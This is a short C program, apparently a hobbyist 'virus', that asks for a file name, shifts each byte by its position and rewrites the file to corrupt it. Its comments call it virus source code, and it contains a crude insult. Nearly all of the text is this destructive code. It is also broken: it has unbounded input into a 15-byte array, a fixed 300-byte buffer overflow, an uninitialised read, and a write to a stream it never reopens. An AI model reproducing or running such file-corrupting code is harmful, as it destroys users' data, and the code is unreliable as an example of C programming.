#include<stdio.h>
#include<stdlib.h>
#include<malloc.h>
#include<string.h>

char fname[15],*to_write,buf; // The first,second, and the third ones are the filename taken as input, the data to write to the stream, and the third one is simply a buffer

int i; // Consider this as a counter var

FILE *f; // Our file stream
char *vir_source = __FILE__; // The one that stores the name of the current file, encrypt.c

int main()
{
printf("enter the file name:");
scanf("%s",&fname);


if(strcmp(vir_source,fname) == 0)
{
        printf("\vASS****,\n\tyou trying to destroy your virus source code!");
        return 0;
}

f=fopen(fname,"r"); // Replaced the r+ with r and then write, as , r+ will append the stream, and not overwrite the stream

to_write=(char *)malloc(300*(sizeof(char)));

for(i=0;buf != EOF;i++)
{
        buf = fgetc(f);
        to_write[i]=buf+i;
}

// Apart from the loop, the following can also be tried
// fgets(to_write,300,f);

fclose(f);
fopen(fname,"w"); // This will overwrite the file and hence corrupts the stream
fputs(to_write,f);
fclose(f);
return 0;
}
